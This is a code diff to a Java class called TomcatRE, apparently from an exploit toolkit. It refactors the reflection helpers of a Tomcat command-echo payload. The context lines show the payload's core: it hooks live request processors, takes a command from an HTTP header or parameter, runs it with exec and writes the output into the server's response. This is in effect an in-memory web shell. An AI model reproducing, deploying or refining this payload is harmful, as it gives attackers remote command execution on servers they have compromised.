@@ -63,11 +63,11 @@ public class TomcatRE {
                 for (int j = 0; j < processors.size(); j++) {
                     Object processor = processors.get(j);
                     Object request = getFieldValue(processor, "req");
-                    Object response = invokeMethod(request.getClass(), request, "getResponse", new Class[]{}, new Object[]{});
+                    Object response = invokeMethod(request, "getResponse", new Class[]{}, new Object[]{});
 
-                    Object header = invokeMethod(request.getClass(), request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
-                    Object parameters = invokeMethod(request.getClass(), request, "getParameters", new Class[]{}, new Object[]{});
-                    Object param = invokeMethod(parameters.getClass(), parameters, "getParameter", new Class[]{String.class}, new Object[]{PARAM});
+                    Object header = invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
+                    Object parameters = invokeMethod(request, "getParameters", new Class[]{}, new Object[]{});
+                    Object param = invokeMethod(parameters, "getParameter", new Class[]{String.class}, new Object[]{PARAM});
 
                     String str = null;
                     if (header != null) {
@@ -76,9 +76,9 @@ public class TomcatRE {
                         str = (String) param;
                     }
                     String result = exec(str);
-                    invokeMethod(response.getClass(), response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
+                    invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
                     try {
-                        invokeMethod(response.getClass(), response, "doWrite", new Class[]{java.nio.ByteBuffer.class}, new Object[]{java.nio.ByteBuffer.wrap(result.getBytes())});
+                        invokeMethod(response, "doWrite", new Class[]{java.nio.ByteBuffer.class}, new Object[]{java.nio.ByteBuffer.wrap(result.getBytes())});
                     } catch (Exception e) {
                         Class clazz;
                         try {
@@ -88,7 +88,7 @@ public class TomcatRE {
                         }
                         Object byteChunk = clazz.newInstance();
                         invokeMethod(clazz, byteChunk, "setBytes", new Class[]{byte[].class, Integer.TYPE, Integer.TYPE}, new Object[]{result.getBytes(), 0, result.getBytes().length});
-                        invokeMethod(response.getClass(), response, "doWrite", new Class[]{clazz}, new Object[]{byteChunk});
+                        invokeMethod(response, "doWrite", new Class[]{clazz}, new Object[]{byteChunk});
                     }
 
                     return;
@@ -134,6 +134,14 @@ public class TomcatRE {
                 field = getField(clazz.getSuperclass(), fieldName);
         }
         return field;
+    }
+
+    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
+        try {
+            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
+        }catch (Exception e){
+            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
+        }
     }
 
     public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
